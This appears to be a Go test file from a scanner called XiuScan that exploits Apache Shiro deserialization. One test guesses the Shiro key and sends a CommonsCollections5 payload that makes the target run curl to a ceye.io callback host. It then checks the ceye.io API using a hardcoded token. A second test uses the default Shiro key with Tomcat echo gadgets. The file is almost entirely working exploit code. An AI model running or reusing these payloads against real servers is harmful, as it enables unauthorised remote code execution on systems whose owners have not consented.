package test

import (
	"encoding/hex"
	"fmt"
	gososerial "github.com/EmYiQing/Gososerial"
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/shiro"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strings"
	"testing"
	"time"
)

func TestFindShiro(t *testing.T) {
	target := "http://192.168.222.132:8080/"
	key := shiro.CheckShiroKey(target)
	if key != "" {
		log.Info("find key: %s", key)
	}
	randStr := tool.GetRandomLetter(20)
	payload := gososerial.GetCC5("curl 772m76.ceye.io/" + randStr)
	shiro.SendPayload(key, payload, target)
	time.Sleep(time.Second * 3)
	resp := http.Get("http://api.ceye.io/v1/records?token=59408d12c25f5163ae82409e76ef4898&type=http&filter=" + randStr)
	if strings.Contains(string(resp.Body), randStr) {
		log.Info("find shiro deserialization")
	}
}

func TestEcho(t *testing.T) {
	key := "kPH+bIxk5D2deZiIxcaaaA=="
	target := "http://192.168.222.132:8080/"
	K1 := shiro.CCK1TomcatEchoHex
	K2 := shiro.CCK2TomcatEchoHex
	K1B, _ := hex.DecodeString(K1)
	K2B, _ := hex.DecodeString(K2)
	S1 := shiro.CheckTomcatEcho(key, K1B, target)
	S2 := shiro.CheckTomcatEcho(key, K2B, target)
	fmt.Println(S1)
	fmt.Println(S2)
}
